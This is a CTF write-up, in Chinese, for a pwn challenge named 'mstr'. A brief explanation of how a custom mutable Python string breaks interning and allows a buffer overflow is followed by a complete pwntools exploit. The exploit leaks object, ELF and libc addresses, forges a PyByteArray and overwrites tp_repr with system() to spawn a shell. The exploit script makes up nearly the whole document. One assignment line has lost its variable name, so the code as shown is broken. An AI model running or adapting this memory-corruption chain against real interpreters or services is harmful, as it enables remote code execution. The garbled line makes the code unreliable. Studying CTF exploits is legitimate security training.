# mstr writeup

## 漏洞点

python 单字符字符串驻留机制和实现的 mutable string 里就地修改字符串产生矛盾，使得可以覆盖 length 字段造成缓冲区溢出。首先覆盖 str 对象的字符串指针泄露 Object 地址，之后泄露 ELF 基地址，获取到 PyByteArray_Type 的地址，进而伪造 PyByteArray 对象泄露 libc 地址；最后覆盖 tp_repr 函数指针为 system，调用 print 函数即可.



## exp

```python
from pwn import *
import re
import ast
import psutil
import os
import subprocess

def getpid(cmdline:str):
    pids = []
    for proc in psutil.process_iter(['pid', 'cmdline']):
        _cmdline = ' '.join(proc.cmdline())
        if _cmdline == cmdline:
            pids.append(proc.pid)

    return pids[-1]

context.arch = 'amd64'
context.terminal = ['zellij', 'action', 'new-pane', '--direction', 'right', '--']
# context.log_level = 'debug'

preamble = b'''
new BBBBBBBBBBBBBBBB
new AAAAAAAAAAAAAAAA
new CCCCCCCCCCCCCCCC
new 5
set_max 5 1
+= 3 3
+= 3 3
'''.strip()

cmdline = '/usr/local/bin/python3 /home/ctf/mstr.py'
container_name = 'py_pwn4'

r = ("127.0.0.1", 1234)

def remote_dbg():
    pid = getpid(cmdline)
    cmd = f'docker exec {container_name} gdbserver --attach :1234 {pid}'
    os.system(f'nohup {cmd} > /dev/null 2>&1 &')
    sleep(.2)
    gdb.attach(r, gdbscript='set substitute-path /home/ctf/Python-3.12.4 /home/nipe/py_pwn/Python-3.12.4')
    pause()

def pwn(p, offset):
    def modify_max_size():
        p.sendline(preamble) # modify aaa's size to overflow bbb; B大概率在A 0x100 处

    def add(data:bytes):
        p.sendline(b"new " + data)

    def copy(dest:int, src:int):
        cmd = b"+= " + str(dest).encode() + b" " + str(src).encode()
        p.sendline(cmd)

    def modify(idx:int, offset:int, val:int):
        cmd = b"modify " + str(idx).encode() + b" " + str(offset).encode() + b" " + str(val).encode()
        p.sendline(cmd)

    # allow us send char > 0x80
    def add2(data:bytes):
        length = len(data)
        add(b"a"*length) # 

        for i in range(length):
            if i != 5:
                modify(4, i, data[i])

    
    # p = gdb.debug(["./python3.12", "mstr.py"])
    modify_max_size()
    print(p.recv())
    payload = b"x"*(0x100-0x38) + p64(0x2) + p16(offset) # A to C 0x100
    add2(payload)
    print(p.recv())
    copy(1, 4)
    # remote_dbg()
    p.recv(4096)
    p.sendline(b"print 2")
    time.sleep(.1)
    data = p.recv()
    return data.decode()
    # p.interactive()

def _copy(dest:int, src:int):
    cmd = b"+= " + str(dest).encode() + b" " + str(src).encode()
    p.sendline(cmd)

def _modify(idx:int, offset:int, val:int):
    cmd = b"modify " + str(idx).encode() + b" " + str(offset).encode() + b" " + str(val).encode()
    p.sendline(cmd)

def _add2(data:bytes):
    length = len(data)
    p.sendline(b"new " + b"a"*length)
    for i in range(length):
        if i != 5:
            _modify(6, i, data[i])

for i in range(256):
    try:
        p = remote("127.0.0.1", 9999)
        
        print(f"i={i}", end=' ')
        # 1. leak str object addr
        data = pwn(p, (i<<8)|0x00)
        print(f'data: {data}')
        addrs = re.findall(r"0x([0-9a-fA-F]+)", data)
        # p.interactive()

        if len(addrs) > 0:
            addr_of_c = int(addrs[0], 16)
            # 2. leak elf base addr
            p.sendline(b"new aaa") # idx 5, placeholder

            fake_pytype_addr = addr_of_c + 0x10 # probably safe addr
            # now we will start by addr_of_c + 0xa, we need to use modify function to set (addr_of_c + 0x8)
            payload = flat({
                0x0: p64(0x2), # refcount
                0x8: p64(0x0), # ob_type
                0x10: p64(0x10), # ob_size
                0x18: p64(addr_of_c+0xc8), # tp_name to leak address
                0x58: p64(0x0), # tp_repr set to NULL
                0x88: p64(0x0), # tp_str set to NULL
            })
            padding = b"X"*0x6
            _add2(padding+payload) # idx 6
            _copy(1, 6)
            log.info(f"C's addr: {addr_of_c:#x}!")

            for i in range(8):
                _modify(1, 0x100-0x28+8+i, p64(fake_pytype_addr)[i])

            # _modify(1, 0x100-0x28+0x0, 0xbb)
            # _modify(1, 0x100-0x28+0xc8-0x8, 0x70) # modify the tp_name lowest byte to 0x10(<0x80)
            # 1/8 chance to leak elf_base

            p.sendline(b"print 2")
            # context.log_level = 'debug'
            p.recvuntil(b"<")
            data = p.recv(3)
            
            assert (data == b"\xef\xbf\xbd")
            data = p.recv(5)
            if b"\xef\xbf\xbd" in data:
                continue
            elf_addr = u64((b"\xc0" + data).ljust(8, b"\x00") )
            elf_base = elf_addr - 0x584fc0 
            
            log.info(f"elf_addr: {elf_addr:#x}")
            log.info(f"elf_base: {elf_base:#x}")
    
            dup2_got_entry = elf_base + 0x567458
            # fake a byte array
              = elf_base + 0x568a40 # p &PyByteArray_Type
            # remote_dbg()
            fake_byte_array = [0x100, PyByteArray_Type, 0x100, 0x100, dup2_got_entry, dup2_got_entry, 0x100]

            def _modify_qword(offset, val):
                for i in range(8):
                    _modify(1, 0x100-0x28+offset+i, p64(val)[i])
            

            for i in range(len(fake_byte_array)):
                _modify_qword(8*i, fake_byte_array[i])

            # 3. leak libc 
            p.sendline(b"print 2")
            p.recvuntil(b"bytearray(")
            libc_text = p.recvuntil(b")",drop=True).decode()
            print(f"libc_text: {libc_text}")
            # pause()
            libc_text = ast.literal_eval(libc_text)[0:8]
            dup2_addr = u64(libc_text)
            
            libc_base = dup2_addr - 0x116990
            system = libc_base + 0x58750
            log.info(f"dup2_addr: {dup2_addr:#x}")
            log.info(f"libc_base: {libc_base:#x}")
           
            # finnaly set tp_repr to system
            # print(p.recv())
            _modify_qword(0x88, system)
            _modify_qword(0x58, system)
            _modify_qword(0x8, addr_of_c)
            _modify_qword(0x0, int.from_bytes(b"qh", 'little')) # refcount will + 2
            # get shell
            p.sendline(b"print 2")
            
            p.interactive()
            break
    except Exception as e:
        p.close()

```

